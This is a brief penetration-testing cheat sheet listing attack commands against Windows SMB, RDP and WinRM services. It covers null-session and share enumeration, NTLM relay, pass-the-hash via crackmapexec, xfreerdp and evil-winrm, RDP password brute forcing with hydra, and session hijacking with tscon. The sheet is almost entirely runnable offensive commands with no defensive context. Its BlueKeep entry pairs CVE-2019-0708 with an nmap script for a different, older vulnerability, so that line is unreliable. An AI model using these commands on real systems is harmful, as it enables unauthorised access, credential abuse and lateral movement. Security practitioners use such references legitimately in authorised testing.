# SMB, RDP, WinRM Attacks

## SMB Attacks
```bash
# Null session
smbclient -L //target -N
rpcclient -U "" -N target
# Share enumeration
smbclient -L //target -U user%password
crackmapexec smb target -u user -p password --shares
# EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 target
# Relay
impacket-ntlmrelayx -t target -smb2support
# Pass-the-Hash
crackmapexec smb target -u admin -H 'ntlm_hash'
```

## RDP Attacks
```bash
# NLA check
nmap --script rdp-enum-encryption -p 3389 target
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://target
# BlueKeep (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p 3389 target
# RDP session hijacking
tscon <session_id> /dest:<session_id>
# Pass-the-Hash with RDP
xfreerdp /v:target /u:admin /pth:ntlm_hash
```

## WinRM Attacks
```bash
# Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H 'ntlm_hash'
# With scripts
evil-winrm -i target -u user -p password -s /scripts/
# With executables
evil-winrm -i target -u user -p password -e /exes/
```

## Tools
```bash
# crackmapexec
# impacket
# evil-winrm
# smbclient
# enum4linux
```
